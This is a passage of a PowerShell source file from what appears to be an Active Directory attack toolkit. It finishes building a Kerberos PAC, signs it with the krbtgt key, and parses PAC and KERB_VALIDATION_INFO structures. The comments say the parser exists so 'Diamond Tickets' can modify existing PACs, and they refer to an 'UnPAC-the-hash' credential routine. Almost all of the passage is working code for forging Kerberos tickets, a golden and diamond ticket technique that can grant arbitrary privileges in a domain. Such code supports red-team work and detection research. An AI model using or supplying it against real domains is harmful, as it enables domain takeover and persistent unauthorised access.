    $padding5 = $requestorInfoPadded - $requestorInfo.Length
    if ($padding5 -gt 0) { $pac.AddRange([byte[]]::new($padding5)) }

    # Add SERVER_CHECKSUM with padding
    $serverChecksumOffset = $pac.Count + 4  # Points to signature bytes (after 4-byte SignatureType)
    $pac.AddRange($serverSig)
    $padding6 = $serverSigPadded - $serverSig.Length
    if ($padding6 -gt 0) { $pac.AddRange([byte[]]::new($padding6)) }

    # Add PRIVSVR_CHECKSUM with padding
    $kdcChecksumOffset = $pac.Count + 4  # Points to signature bytes (after 4-byte SignatureType)
    $pac.AddRange($kdcSig)
    $padding7 = $kdcSigPadded - $kdcSig.Length
    if ($padding7 -gt 0) { $pac.AddRange([byte[]]::new($padding7)) }

    $totalSize = $pac.Count
    Write-Verbose "[Build-PAC] Total PAC: $totalSize bytes, bufferCount=$bufferCount, headerSize=$headerSize"
    Write-Verbose "[Build-PAC] Offsets: LOGON=$offset1, CLIENT=$offset2, UPN_DNS=$offset3, ATTRIB=$offset4, REQUESTOR=$offset5, ServerSig=$offset6, KDCSig=$offset7"
    Write-Verbose "[Build-PAC] ServerChecksumOffset=$serverChecksumOffset, KDCChecksumOffset=$kdcChecksumOffset"
    Write-Verbose "[Build-PAC] PAC header first 8 bytes: $(($pac.ToArray()[0..7] | ForEach-Object { '0x{0:X2}' -f $_ }) -join ' ')"

    return [PSCustomObject]@{
        PACData = [byte[]]$pac.ToArray()
        ServerChecksumOffset = $serverChecksumOffset
        KDCChecksumOffset = $kdcChecksumOffset
        SignatureType = $sigType
    }
}

# ============================================================================
# PAC Signature Computation
# ============================================================================

function Complete-PACSignatures {
    <#
    .SYNOPSIS
        Computes and inserts PAC signatures using the krbtgt key.

    .DESCRIPTION
        Calculates the PAC checksums:
        1. Server checksum: HMAC over PAC with signatures zeroed, using KeyUsage 17
        2. KDC checksum: HMAC over server checksum bytes, using KeyUsage 17

    .PARAMETER PACData
        The PAC bytes with zeroed signatures.

    .PARAMETER ServerChecksumOffset
        Offset to server signature data.

    .PARAMETER KDCChecksumOffset
        Offset to KDC signature data.

    .PARAMETER Key
        The krbtgt key bytes (NT-Hash for RC4, AES key for AES).

    .PARAMETER EncryptionType
        The encryption type (17, 18, or 23).

    .OUTPUTS
        Byte array of PAC with computed signatures.

    .NOTES
        Key usage 17 is used for PAC checksums (MS-PAC 2.8.1).
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$PACData,

        [Parameter(Mandatory=$true)]
        [int]$ServerChecksumOffset,

        [Parameter(Mandatory=$true)]
        [int]$KDCChecksumOffset,

        [Parameter(Mandatory=$true)]
        [byte[]]$Key,

        [Parameter(Mandatory=$true)]
        [ValidateSet(17, 18, 23)]
        [int]$EncryptionType
    )

    # Make a copy of PAC data
    $pac = [byte[]]::new($PACData.Length)
    [Array]::Copy($PACData, $pac, $PACData.Length)

    # Determine signature length
    $sigLength = if ($EncryptionType -eq 23) { 16 } else { 12 }

    # Key usage for PAC checksums
    $keyUsage = 17

    # Verify signatures are zeroed before computing
    $serverSigZeroed = $true
    $kdcSigZeroed = $true
    for ($si = 0; $si -lt $sigLength; $si++) {
        if ($pac[$ServerChecksumOffset + $si] -ne 0) { $serverSigZeroed = $false; break }
    }
    for ($si = 0; $si -lt $sigLength; $si++) {
        if ($pac[$KDCChecksumOffset + $si] -ne 0) { $kdcSigZeroed = $false; break }
    }
    Write-Verbose "[Complete-PACSignatures] PAC=$($pac.Length) bytes, sigLength=$sigLength, ServerOffset=$ServerChecksumOffset, KDCOffset=$KDCChecksumOffset"
    Write-Verbose "[Complete-PACSignatures] Server sig zeroed: $serverSigZeroed, KDC sig zeroed: $kdcSigZeroed"
    Write-Verbose "[Complete-PACSignatures] Bytes at ServerOffset-4..ServerOffset+3: $(($pac[($ServerChecksumOffset-4)..($ServerChecksumOffset+3)] | ForEach-Object { '0x{0:X2}' -f $_ }) -join ' ')"
    Write-Verbose "[Complete-PACSignatures] Bytes at KDCOffset-4..KDCOffset+3: $(($pac[($KDCChecksumOffset-4)..($KDCChecksumOffset+3)] | ForEach-Object { '0x{0:X2}' -f $_ }) -join ' ')"

    # Diagnostic: Dump PAC header to verify offsets match
    $cBufs = [BitConverter]::ToUInt32($pac, 0)
    Write-Verbose "[Complete-PACSignatures] PAC has $cBufs buffers:"
    for ($bi = 0; $bi -lt $cBufs; $bi++) {
        $bufOff = 8 + ($bi * 16)
        $bType = [BitConverter]::ToUInt32($pac, $bufOff)
        $bSize = [BitConverter]::ToUInt32($pac, $bufOff + 4)
        $bOffset = [BitConverter]::ToUInt64($pac, $bufOff + 8)
        $bTypeName = switch ($bType) { 1 { "LOGON_INFO" } 6 { "SVR_CKSUM" } 7 { "KDC_CKSUM" } 10 { "CLIENT" } 12 { "UPN_DNS" } 17 { "ATTRIB" } 18 { "REQUESTOR" } default { "TYPE_$bType" } }
        Write-Verbose "[Complete-PACSignatures]   Buffer[$bi]: Type=$bType ($bTypeName), Size=$bSize, Offset=$bOffset"
    }

    # Compute server checksum (MS-PAC 2.8.1)
    # Both signature fields must be zeroed when computing server checksum
    # (Build-PAC already provides zeroed signatures)
    # Use native Windows crypto via cryptdll.dll CDLocateCheckSum (same as Rubeus)
    Write-Verbose "[Complete-PACSignatures] PAC first 16 bytes: $(($pac[0..15] | ForEach-Object { '{0:X2}' -f $_ }) -join ' ')"
    Write-Verbose "[Complete-PACSignatures] PAC at sig areas: SVR[$ServerChecksumOffset..$(${ServerChecksumOffset}+11)]=$(($pac[$ServerChecksumOffset..($ServerChecksumOffset+11)] | ForEach-Object { '{0:X2}' -f $_ }) -join ' ') KDC[$KDCChecksumOffset..$(${KDCChecksumOffset}+11)]=$(($pac[$KDCChecksumOffset..($KDCChecksumOffset+11)] | ForEach-Object { '{0:X2}' -f $_ }) -join ' ')"
    $serverChecksum = Get-KerberosChecksumNative -Key $Key -Data $pac -KeyUsage $keyUsage -EncryptionType $EncryptionType

    # Insert server checksum
    Write-Verbose "[Complete-PACSignatures] Server checksum ($($serverChecksum.Length) bytes): $(($serverChecksum[0..([Math]::Min(11,$serverChecksum.Length-1))] | ForEach-Object { '{0:X2}' -f $_ }) -join '')"
    [Array]::Copy($serverChecksum, 0, $pac, $ServerChecksumOffset, $sigLength)

    # Compute KDC checksum (MS-PAC 2.8.2)
    # KDC checksum is keyed hash of the server checksum value only
    # Use native Windows crypto via cryptdll.dll CDLocateCheckSum (same as Rubeus)
    $kdcChecksum = Get-KerberosChecksumNative -Key $Key -Data $serverChecksum -KeyUsage $keyUsage -EncryptionType $EncryptionType

    # Insert KDC checksum
    [Array]::Copy($kdcChecksum, 0, $pac, $KDCChecksumOffset, $sigLength)

    return $pac
}

# ============================================================================
# PAC Parser Functions (for Diamond Tickets)
# ============================================================================

function Read-UInt16LE {
    <#
    .SYNOPSIS
        Reads a 16-bit unsigned integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToUInt16($Data, $Offset)
}

function Read-UInt32LE {
    <#
    .SYNOPSIS
        Reads a 32-bit unsigned integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToUInt32($Data, $Offset)
}

function Read-Int32LE {
    <#
    .SYNOPSIS
        Reads a 32-bit signed integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToInt32($Data, $Offset)
}

function Read-UInt64LE {
    <#
    .SYNOPSIS
        Reads a 64-bit unsigned integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToUInt64($Data, $Offset)
}

function Read-Int64LE {
    <#
    .SYNOPSIS
        Reads a 64-bit signed integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToInt64($Data, $Offset)
}

function ConvertFrom-FileTime {
    <#
    .SYNOPSIS
        Converts a Windows FILETIME to DateTime.
    #>
    [CmdletBinding()]
    param([int64]$FileTime)

    try {
        if ($FileTime -le 0 -or $FileTime -ge [datetime]::MaxValue.ToFileTimeUtc()) {
            return [datetime]::MaxValue
        }
        return [datetime]::FromFileTimeUtc($FileTime)
    }
    catch {
        return [datetime]::MaxValue
    }
}

function ConvertTo-SIDString {
    <#
    .SYNOPSIS
        Converts binary SID to string format.
    #>
    [CmdletBinding()]
    param([byte[]]$SIDBytes)

    try {
        $sid = New-Object System.Security.Principal.SecurityIdentifier($SIDBytes, 0)
        return $sid.Value
    }
    catch {
        Write-Log "[ConvertTo-SIDString] Failed to parse SID bytes - $_" -Level Error
        return $null
    }
}

function Read-PAC {
    <#
    .SYNOPSIS
        Parses a PAC (Privilege Attribute Certificate) structure.

    .DESCRIPTION
        Reads and parses a PAC from binary data, extracting:
        - KERB_VALIDATION_INFO: User info and group memberships
        - PAC_CLIENT_INFO: Client name and timestamp
        - PAC_SIGNATURE_DATA: Server and KDC checksums

    .PARAMETER PACData
        The raw PAC bytes.

    .OUTPUTS
        PSCustomObject with parsed PAC information.

    .EXAMPLE
        $pac = Read-PAC -PACData $pacBytes
        $pac.UserName
        $pac.GroupRIDs

    .NOTES
        Used by Diamond Ticket to parse and modify existing PAC.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$PACData
    )

    try {
        # PACTYPE header
        $cBuffers = Read-UInt32LE -Data $PACData -Offset 0
        $version = Read-UInt32LE -Data $PACData -Offset 4

        Write-Log "[Read-PAC] PAC has $cBuffers buffers, version $version" -Level Debug

        $buffers = @()
        $offset = 8

        # Read PAC_INFO_BUFFER entries
        for ($i = 0; $i -lt $cBuffers; $i++) {
            $bufferType = Read-UInt32LE -Data $PACData -Offset $offset
            $bufferSize = Read-UInt32LE -Data $PACData -Offset ($offset + 4)
            $bufferOffset = Read-UInt64LE -Data $PACData -Offset ($offset + 8)

            $buffers += [PSCustomObject]@{
                Type = $bufferType
                Size = $bufferSize
                Offset = $bufferOffset
            }

            $offset += 16
        }

        # Initialize result
        $result = [PSCustomObject]@{
            Version = $version
            BufferCount = $cBuffers
            Buffers = $buffers
            UserName = $null
            Domain = $null
            DomainSID = $null
            UserRID = $null
            PrimaryGroupRID = $null
            GroupRIDs = @()
            GroupAttributes = @()
            ExtraSIDs = @()
            LogonTime = $null
            UserAccountControl = $null
            # Rich fields preserved for faithful Diamond Ticket rebuild
            FullName = ""
            LogonScript = ""
            ProfilePath = ""
            HomeDirectory = ""
            HomeDirectoryDrive = ""
            LogonServer = ""
            LogonCount = 0
            BadPasswordCount = 0
            UserFlags = 0
            LogoffTimeRaw = $null
            KickOffTimeRaw = $null
            PasswordLastSetRaw = $null
            PasswordCanChangeRaw = $null
            PasswordMustChangeRaw = $null
            ServerChecksumOffset = $null
            KDCChecksumOffset = $null
            ServerChecksum = $null
            KDCChecksum = $null
            SignatureType = $null
            RawValidationInfo = $null
            RawValidationInfoOffset = $null
            RawValidationInfoSize = $null
            CredentialInfoBuffer = $null
        }

        # Parse each buffer
        foreach ($buffer in $buffers) {
            # Bounds check: ensure buffer offset and size are within PAC data
            if ($buffer.Offset -lt 0 -or $buffer.Size -lt 0 -or
                ($buffer.Offset + $buffer.Size) -gt $PACData.Length) {
                Write-Log "[Read-PAC] Buffer type $($buffer.Type) exceeds PAC bounds: offset=$($buffer.Offset), size=$($buffer.Size), PAC length=$($PACData.Length)" -Level Warning
                continue
            }
            $bufferData = $PACData[$buffer.Offset..($buffer.Offset + $buffer.Size - 1)]

            switch ($buffer.Type) {
                $Script:PAC_LOGON_INFO {
                    Write-Log "[Read-PAC] Parsing LOGON_INFO at offset $($buffer.Offset)" -Level Debug
                    $logonInfo = Read-KerbValidationInfo -Data $bufferData
                    $result.UserName = $logonInfo.UserName
                    $result.Domain = $logonInfo.Domain
                    $result.DomainSID = $logonInfo.DomainSID
                    $result.UserRID = $logonInfo.UserRID
                    $result.PrimaryGroupRID = $logonInfo.PrimaryGroupRID
                    $result.GroupRIDs = $logonInfo.GroupRIDs
                    $result.GroupAttributes = $logonInfo.GroupAttributes
                    $result.ExtraSIDs = $logonInfo.ExtraSIDs
                    $result.LogonTime = $logonInfo.LogonTime
                    $result.UserAccountControl = $logonInfo.UserAccountControl
                    $result.FullName = $logonInfo.FullName
                    $result.LogonScript = $logonInfo.LogonScript
                    $result.ProfilePath = $logonInfo.ProfilePath
                    $result.HomeDirectory = $logonInfo.HomeDirectory
                    $result.HomeDirectoryDrive = $logonInfo.HomeDirectoryDrive
                    $result.LogonServer = $logonInfo.LogonServer
                    $result.LogonCount = $logonInfo.LogonCount
                    $result.BadPasswordCount = $logonInfo.BadPasswordCount
                    $result.UserFlags = $logonInfo.UserFlags
                    $result.LogoffTimeRaw = $logonInfo.LogoffTimeRaw
                    $result.KickOffTimeRaw = $logonInfo.KickOffTimeRaw
                    $result.PasswordLastSetRaw = $logonInfo.PasswordLastSetRaw
                    $result.PasswordCanChangeRaw = $logonInfo.PasswordCanChangeRaw
                    $result.PasswordMustChangeRaw = $logonInfo.PasswordMustChangeRaw
                    $result.RawValidationInfo = $bufferData
                    $result.RawValidationInfoOffset = $buffer.Offset
                    $result.RawValidationInfoSize = $buffer.Size
                }

                $Script:PAC_CREDENTIALS_INFO {
                    # PAC_CREDENTIAL_INFO (Type 2) - encrypted credential data
                    # Contains NTLM hash when present (e.g., from PKINIT U2U)
                    # Structure: Version(4) + EncryptionType(4) + SerializedData(rest)
                    # We store raw bytes here; decryption happens in Invoke-UnPACTheHash with the AS-REP Reply Key
                    Write-Log "[Read-PAC] Found CREDENTIAL_INFO at offset $($buffer.Offset) ($($buffer.Size) bytes)" -Level Debug
                    $result.CredentialInfoBuffer = $bufferData
                }

                $Script:PAC_CLIENT_INFO_TYPE {
                    Write-Log "[Read-PAC] Parsing CLIENT_INFO at offset $($buffer.Offset)" -Level Debug
                    $clientInfo = Read-PACClientInfo -Data $bufferData
                    if (-not $result.UserName) {
                        $result.UserName = $clientInfo.ClientName
                    }
                }

                $Script:PAC_SERVER_CHECKSUM {
                    Write-Log "[Read-PAC] Parsing SERVER_CHECKSUM at offset $($buffer.Offset)" -Level Debug
                    $sigInfo = Read-PACSignature -Data $bufferData
                    $result.ServerChecksumOffset = $buffer.Offset + 4  # +4 to skip SignatureType
                    $result.ServerChecksum = $sigInfo.Signature
                    $result.SignatureType = $sigInfo.SignatureType
                }

                $Script:PAC_PRIVSVR_CHECKSUM {
                    Write-Log "[Read-PAC] Parsing KDC_CHECKSUM at offset $($buffer.Offset)" -Level Debug
                    $sigInfo = Read-PACSignature -Data $bufferData
                    $result.KDCChecksumOffset = $buffer.Offset + 4  # +4 to skip SignatureType
                    $result.KDCChecksum = $sigInfo.Signature
                }
            }
        }

        return $result
    }
    catch {
        Write-Log "[Read-PAC] Error parsing PAC: $_" -Level Error
        return $null
    }
}

function Read-KerbValidationInfo {
    <#
    .SYNOPSIS
        Parses a KERB_VALIDATION_INFO structure from NDR-marshaled data.

    .DESCRIPTION
        Extracts user information and group memberships from the primary
        PAC buffer. Handles NDR pointer dereferencing and Unicode strings.

    .PARAMETER Data
        The raw KERB_VALIDATION_INFO bytes (without PAC header).

    .NOTES
        This is a simplified parser that extracts the most important fields.
        Full NDR parsing is complex; we focus on what's needed for Diamond Tickets.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    $result = [PSCustomObject]@{
        LogonTime = $null
        UserName = $null
        Domain = $null
        DomainSID = $null
        UserRID = $null
        PrimaryGroupRID = $null
        GroupRIDs = @()
        GroupAttributes = @()
        ExtraSIDs = @()
        UserAccountControl = $null
        # Rich identity/session fields preserved for Diamond Ticket "recut" (faithful PAC rebuild).
        # FILETIME fields are kept as RAW int64 so they can be re-emitted byte-for-byte.
        FullName = ""
        LogonScript = ""
        ProfilePath = ""
        HomeDirectory = ""
        HomeDirectoryDrive = ""
        LogonServer = ""
        LogonCount = 0
        BadPasswordCount = 0
        UserFlags = 0
        LogoffTimeRaw = $null
        KickOffTimeRaw = $null
        PasswordLastSetRaw = $null
        PasswordCanChangeRaw = $null
        PasswordMustChangeRaw = $null
    }

    try {
        $offset = 0

        # Skip NDR type serialization header if present (MS-RPCE 2.2.6)
        # Common header (8 bytes): Version(1)=0x01 + Endianness(1)=0x10 + CommonHeaderLength(2) + Filler(4)
        # Private header (8 bytes): ObjectBufferLength(4) + Filler(4)
        # Total: 16 bytes (both headers always present together)
        if ($Data.Length -ge 16 -and $Data[0] -eq 0x01 -and $Data[1] -eq 0x10) {
            $offset = 16
            Write-Log "[Read-KerbValidationInfo] Skipped NDR header (16 bytes)" -Level Debug
        }

        # NDR referent ID for the top-level pointer (4 bytes) - skip if present
        # This is the UniqueId for the KERB_VALIDATION_INFO pointer
        $possibleReferentId = Read-UInt32LE -Data $Data -Offset $offset
        if ($possibleReferentId -eq 0x00020000 -or ($possibleReferentId -band 0xFFFF0000) -eq 0x00020000) {
            $offset += 4
            Write-Log "[Read-KerbValidationInfo] Skipped top-level referent ID" -Level Debug
        }

        Write-Log "[Read-KerbValidationInfo] Fixed structure starts at offset $offset" -Level Debug

        # === FIXED STRUCTURE (KERB_VALIDATION_INFO) ===
        # All RPC_UNICODE_STRING fields: Length(2) + MaxLength(2) + Pointer(4) = 8 bytes
        # Track all pointer values to know which referents to expect

        # LogonTime (FILETIME - 8 bytes)
        $logonTime = Read-Int64LE -Data $Data -Offset $offset
        $result.LogonTime = ConvertFrom-FileTime -FileTime $logonTime
        $offset += 8

        # LogoffTime (8 bytes) - capture raw for faithful rebuild
        $result.LogoffTimeRaw = Read-Int64LE -Data $Data -Offset $offset
        $offset += 8

        # KickOffTime (8 bytes)
        $result.KickOffTimeRaw = Read-Int64LE -Data $Data -Offset $offset
        $offset += 8

        # PasswordLastSet (8 bytes)
        $result.PasswordLastSetRaw = Read-Int64LE -Data $Data -Offset $offset
        $offset += 8

        # PasswordCanChange (8 bytes)
        $result.PasswordCanChangeRaw = Read-Int64LE -Data $Data -Offset $offset
        $offset += 8

        # PasswordMustChange (8 bytes)
        $result.PasswordMustChangeRaw = Read-Int64LE -Data $Data -Offset $offset
        $offset += 8

        # EffectiveName (RPC_UNICODE_STRING - 8 bytes)
        $effectiveNamePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # FullName (RPC_UNICODE_STRING - 8 bytes)
        $fullNamePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # LogonScript (RPC_UNICODE_STRING - 8 bytes)
        $logonScriptPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # ProfilePath (RPC_UNICODE_STRING - 8 bytes)
        $profilePathPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # HomeDirectory (RPC_UNICODE_STRING - 8 bytes)
        $homeDirPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # HomeDirectoryDrive (RPC_UNICODE_STRING - 8 bytes)
        $homeDirDrivePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # LogonCount (2 bytes)
        $result.LogonCount = Read-UInt16LE -Data $Data -Offset $offset
        $offset += 2

        # BadPasswordCount (2 bytes)
        $result.BadPasswordCount = Read-UInt16LE -Data $Data -Offset $offset
        $offset += 2

        # UserId (4 bytes)
        $result.UserRID = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # PrimaryGroupId (4 bytes)
        $result.PrimaryGroupRID = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # GroupCount (4 bytes)
        $groupCount = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # GroupIds pointer (4 bytes)
        $groupsPtr = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # UserFlags (4 bytes)
        $result.UserFlags = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # UserSessionKey (16 bytes)
        $offset += 16

        # LogonServer (RPC_UNICODE_STRING - 8 bytes)
        $logonServerPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # LogonDomainName (RPC_UNICODE_STRING - 8 bytes)
        $domainNamePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # LogonDomainId pointer (4 bytes)
        $domainSidPtr = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # Reserved1 (8 bytes)
        $offset += 8

        # UserAccountControl (4 bytes)
        $result.UserAccountControl = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # SubAuthStatus (4 bytes)
        $offset += 4

        # LastSuccessfulILogon (8 bytes)
        $offset += 8

        # LastFailedILogon (8 bytes)
        $offset += 8

        # FailedILogonCount (4 bytes)
        $offset += 4

        # Reserved3 (4 bytes)
        $offset += 4

        # SidCount (4 bytes)
        $sidCount = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # ExtraSids pointer (4 bytes)
        $extraSidsPtr = Read-UInt32LE -Data $Data -Offset $offset
        $offset += 4

        # ResourceGroupDomainSid pointer (4 bytes) - skip
        $offset += 4

        # ResourceGroupCount (4 bytes) - skip
        $offset += 4

        # ResourceGroupIds pointer (4 bytes) - skip
        $offset += 4

        Write-Log "[Read-KerbValidationInfo] Fixed structure parsed. UserRID=$($result.UserRID), PrimaryGrp=$($result.PrimaryGroupRID), GroupCount=$groupCount, SidCount=$sidCount" -Level Debug
        Write-Log "[Read-KerbValidationInfo] Pointers: EffName=$effectiveNamePtr, FullName=$fullNamePtr, Groups=$groupsPtr, Domain=$domainNamePtr, DomSID=$domainSidPtr, ExtraSids=$extraSidsPtr" -Level Debug

        # === NDR REFERENT DATA ===
        # Referents appear in the order pointers were encountered in the fixed structure.
        # Helper: Read NDR conformant varying string (MaxCount(4) + Offset(4) + ActualCount(4) + data)
        $ReadNDRString = {
            param([byte[]]$d, [int]$o)
            # SAFETY: Always consume at least 12 bytes (NDR header) to prevent infinite loops
            # If we can't read the header, we're at the end of data - return remaining bytes
            if ($o + 12 -gt $d.Length) {
                $remaining = [Math]::Max(0, $d.Length - $o)
                return @{ Value = ""; BytesConsumed = $remaining }
            }
            # NDR conformant varying string: MaxCount(4) + Offset(4) + ActualCount(4) + UTF-16 data
            $ac = Read-UInt32LE -Data $d -Offset ($o + 8)    # ActualCount
            # Guard against corrupt ActualCount exceeding available data
            $maxChars = [Math]::Max(0, [Math]::Floor(($d.Length - $o - 12) / 2))
            if ($ac -gt $maxChars) { $ac = $maxChars }
            $dataLen = $ac * 2                                 # UTF-16 = 2 bytes/char
            $consumed = 12 + $dataLen
            # NDR requires alignment to 4-byte boundary after string data
            if ($consumed % 4 -ne 0) { $consumed += 4 - ($consumed % 4) }
            $val = ""
            if ($ac -gt 0 -and ($o + 12 + $dataLen) -le $d.Length) {
                $val = [System.Text.Encoding]::Unicode.GetString($d[($o + 12)..($o + 12 + $dataLen - 1)])
            }
            # SAFETY: Ensure we always move forward to prevent infinite loop
            if ($consumed -lt 12) { $consumed = 12 }
            return @{ Value = $val; BytesConsumed = $consumed }
        }

        # 1. EffectiveName referent
        if ($effectiveNamePtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.UserName = $str.Value
            $offset += $str.BytesConsumed
            Write-Log "[Read-KerbValidationInfo] EffectiveName: '$($str.Value)'" -Level Debug
        }

        # 2. FullName referent
        if ($fullNamePtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.FullName = $str.Value
            $offset += $str.BytesConsumed
        }

        # 3. LogonScript referent
        if ($logonScriptPtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.LogonScript = $str.Value
            $offset += $str.BytesConsumed
        }

        # 4. ProfilePath referent
        if ($profilePathPtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.ProfilePath = $str.Value
            $offset += $str.BytesConsumed
        }

        # 5. HomeDirectory referent
        if ($homeDirPtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.HomeDirectory = $str.Value
            $offset += $str.BytesConsumed
        }

        # 6. HomeDirectoryDrive referent
        if ($homeDirDrivePtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.HomeDirectoryDrive = $str.Value
            $offset += $str.BytesConsumed
        }

        # 7. GroupIds referent (conformant array of GROUP_MEMBERSHIP)
        if ($groupsPtr -ne 0 -and $groupCount -gt 0) {
            # NDR conformant array: MaxCount(4) + GroupCount * (RID(4) + Attributes(4))
            $offset += 4  # Skip MaxCount
            $groups = @()
            $groupAttrs = @()
            for ($g = 0; $g -lt $groupCount; $g++) {
                if ($offset + 8 -gt $Data.Length) { break }
                $rid = Read-UInt32LE -Data $Data -Offset $offset
                $attr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
                $groups += $rid
                $groupAttrs += $attr
                $offset += 8  # RID(4) + Attributes(4)
            }
            $result.GroupRIDs = $groups
            $result.GroupAttributes = $groupAttrs
            Write-Log "[Read-KerbValidationInfo] GroupRIDs: $($groups -join ', ')" -Level Debug
        }

        # 8. LogonServer referent
        if ($logonServerPtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.LogonServer = $str.Value
            $offset += $str.BytesConsumed
        }

        # 9. LogonDomainName referent
        if ($domainNamePtr -ne 0) {
            $str = & $ReadNDRString $Data $offset
            $result.Domain = $str.Value
            $offset += $str.BytesConsumed
            Write-Log "[Read-KerbValidationInfo] Domain: '$($str.Value)'" -Level Debug
        }

        # 10. LogonDomainId referent (SID)
        if ($domainSidPtr -ne 0) {
            # NDR SID: SubAuthorityCount(4 as MaxCount) + Revision(1) + SubAuthorityCount(1) + IdentifierAuthority(6) + SubAuthority(4*N)
            if ($offset + 4 -le $Data.Length) {
                $offset += 4  # Skip NDR MaxCount

                # Read actual SID structure
                if ($offset + 8 -le $Data.Length) {
                    $sidSubAuthCountActual = $Data[$offset + 1]
                    $sidLength = 8 + ($sidSubAuthCountActual * 4)  # header(8) + subauths

                    if ($offset + $sidLength -le $Data.Length) {
                        $sidBytes = $Data[$offset..($offset + $sidLength - 1)]
                        $result.DomainSID = ConvertTo-SIDString -SIDBytes $sidBytes
                        Write-Log "[Read-KerbValidationInfo] DomainSID: $($result.DomainSID)" -Level Debug
                    }
                    $offset += $sidLength
                }
                # Align to 4-byte boundary
                if ($offset % 4 -ne 0) { $offset += 4 - ($offset % 4) }
            }
        }

        # 11. ExtraSids referent (if present)
        if ($extraSidsPtr -ne 0 -and $sidCount -gt 0) {
            # NDR conformant array: MaxCount(4) + SidCount * (SID_pointer(4) + Attributes(4))
            $offset += 4  # Skip MaxCount

            # First read all pointer+attributes pairs
            $sidEntries = @()
            for ($s = 0; $s -lt $sidCount; $s++) {
                if ($offset + 8 -gt $Data.Length) { break }
                $sidPtr = Read-UInt32LE -Data $Data -Offset $offset
                $sidAttr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
                $sidEntries += @{ Ptr = $sidPtr; Attr = $sidAttr }
                $offset += 8
            }

            # Then read the actual SID referent data
            $extraSids = @()
            foreach ($entry in $sidEntries) {
                if ($entry.Ptr -ne 0 -and $offset + 4 -le $Data.Length) {
                    $offset += 4  # Skip NDR MaxCount

                    if ($offset + 8 -le $Data.Length) {
                        $sidSubAuthCountActual = $Data[$offset + 1]
                        $sidLength = 8 + ($sidSubAuthCountActual * 4)

                        if ($offset + $sidLength -le $Data.Length) {
                            $sidBytes = $Data[$offset..($offset + $sidLength - 1)]
                            $sidString = ConvertTo-SIDString -SIDBytes $sidBytes
                            if ($sidString) { $extraSids += $sidString }
                        }
                        $offset += $sidLength
                        if ($offset % 4 -ne 0) { $offset += 4 - ($offset % 4) }
                    }
                }
            }
            $result.ExtraSIDs = $extraSids
            Write-Log "[Read-KerbValidationInfo] ExtraSIDs: $($extraSids -join ', ')" -Level Debug
        }

        return $result
    }
    catch {
        Write-Log "[Read-KerbValidationInfo] Error parsing at offset $offset : $_" -Level Error
        return $result
    }
}

function Read-PACClientInfo {
    <#
    .SYNOPSIS
        Parses a PAC_CLIENT_INFO structure.

    .PARAMETER Data
        The raw PAC_CLIENT_INFO bytes.

    .OUTPUTS
        PSCustomObject with ClientId and ClientName.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    try {
        $clientId = Read-Int64LE -Data $Data -Offset 0
        $nameLength = Read-UInt16LE -Data $Data -Offset 8

        $clientName = ""
        if ($nameLength -gt 0 -and $Data.Length -ge 10 + $nameLength) {
            $nameBytes = $Data[10..(10 + $nameLength - 1)]
            $clientName = [System.Text.Encoding]::Unicode.GetString($nameBytes)
        }

        return [PSCustomObject]@{
            ClientId = ConvertFrom-FileTime -FileTime $clientId
            ClientName = $clientName
        }
    }
    catch {
        Write-Log "[Read-PACClientInfo] Error parsing: $_" -Level Error
        return [PSCustomObject]@{
            ClientId = $null
            ClientName = ""
        }
    }
}

function Read-PACSignature {
    <#
    .SYNOPSIS
        Parses a PAC_SIGNATURE_DATA structure.

    .PARAMETER Data
        The raw PAC_SIGNATURE_DATA bytes.

    .OUTPUTS
        PSCustomObject with SignatureType and Signature bytes.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    try {
        $signatureType = Read-Int32LE -Data $Data -Offset 0

        # Determine signature length based on type
        $sigLength = switch ($signatureType) {
            $Script:KERB_CHECKSUM_HMAC_MD5 { 16 }
            $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 { 12 }
            $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 { 12 }
            default { 16 }
        }

